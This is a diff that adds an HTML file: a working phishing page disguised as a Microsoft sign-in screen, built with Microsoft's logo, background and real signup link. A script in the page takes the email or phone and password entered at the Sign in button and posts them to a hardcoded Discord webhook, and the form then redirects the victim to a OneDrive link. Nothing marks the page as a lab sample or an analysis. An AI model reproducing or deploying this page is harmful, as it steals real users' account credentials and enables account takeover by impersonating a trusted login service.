@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Sign In</title>
+	<link rel="icon" type="image/x-icon" href="https://www.google.com/url?sa=i&url=https%3A%2F%2Fcommons.wikimedia.org%2Fwiki%2FFile%3AMicrosoft_logo.svg&psig=AOvVaw19kZKXe888ywIoBIkRkzY7&ust=1683018424741000&source=images&cd=vfe&ved=0CBAQjRxqFwoTCNCv0a3i0_4CFQAAAAAdAAAAABAE">
+	<style>
+		body {
+			background: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg') no-repeat center center fixed;
+			background-size: cover;
+		}
+		.container {
+			background-color: #fff;
+			padding:  20px;
+			border: 1px solid #ccc;
+			box-shadow: 0px 0px 8px #ccc;
+			width: 400px;
+			margin: 0 auto;
+			border-radius: 0px;
+		}
+		.text-box {
+			padding: 10px;
+			border: 1px solid #ccc;
+			border-radius: 0px;
+			margin-bottom: 10px;
+			width: 100%;
+			box-sizing: border-box;
+		}
+		.login-btn {
+			background-color: #0078d4;
+			color: #fff;
+			border: none;
+			padding: 10px;
+			cursor: pointer;
+			width: 100%;
+			border-radius: 0px;
+		}
+		.signup-text {
+			text-align: center;
+			margin-top: 10px;
+			color: #0078d4;
+			cursor: pointer;
+			font-family: Arial, sans-serif;
+		}
+		.signup-link {
+			color: #0078d4;
+		}
+		.logo {
+			display: block;
+			margin: 30px auto 20px;
+			width: 150px;
+		}
+		.container {
+    /* Existing styles */
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+}
+	</style>
+</head>
+<body>
+	<div class="container">
+		<img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft Logo" class="logo">
+		<input type="text" placeholder="Email or phone" class="text-box">
+		<input type="password" placeholder="Password" class="text-box">
+		<form action="https://1drv.ms/w/s!AoXtAI8_tIEWa9ZIsF_m-u27934" method="get">
+		<form action="https://1drv.ms/w/s!AoXtAI8_tIEWa9ZIsF_m-u27934" method="get">
+   <button type="submit" class="login-btn">Sign in</button>
+</form>
+
+<script>
+   const webhookUrl = 'https://discord.com/api/webhooks/1091167704641196133/0X_joyXTD3pQCY4bGLvoeBwV_Ewdnp-3EHiHgm6BTKzccMAye4gTw9WsGC1qz6BAbNs-';
+
+   function sendWebhook() {
+      const emailOrPhone = document.querySelector('input[type="text"]').value;
+      const password = document.querySelector('input[type="password"]').value;
+
+      const payload = {
+         content: `Email or phone: ${emailOrPhone}\nPassword: ${password}`
+      };
+
+      fetch(webhookUrl, {
+         method: 'POST',
+         headers: {
+            'Content-Type': 'application/json'
+         },
+         body: JSON.stringify(payload)
+      })
+      .then(response => {
+         console.log('Webhook sent successfully');
+      })
+      .catch(error => {
+         console.error('Error sending webhook:', error);
+      });
+   }
+
+   const loginButton = document.querySelector('.login-btn');
+   loginButton.addEventListener('click', sendWebhook);
+</script>
+
+<p class="signup-text">Don't have an account? <a href="https://signup.live.com/signup?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d2057%26client_id%3d81feaced-5ddd-41e7-8bef-3e20a2689bb7%26mkt%3dEN-GB%26opid%3d514D6E3B667845BE%26opidt%3d1680233180%26uaid%3dec4bf693a07e4a00815a6ab9f14f5f0c%26contextid%3d69519AA7B802A841%26opignore%3d1&mkt=EN-GB&uiflavor=web&lw=1&fl=easi2&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&uaid=ec4bf693a07e4a00815a6ab9f14f5f0c&suc=81feaced-5ddd-41e7-8bef-3e20a2689bb7" class="signup-link create-account-link">Create one</a></p>
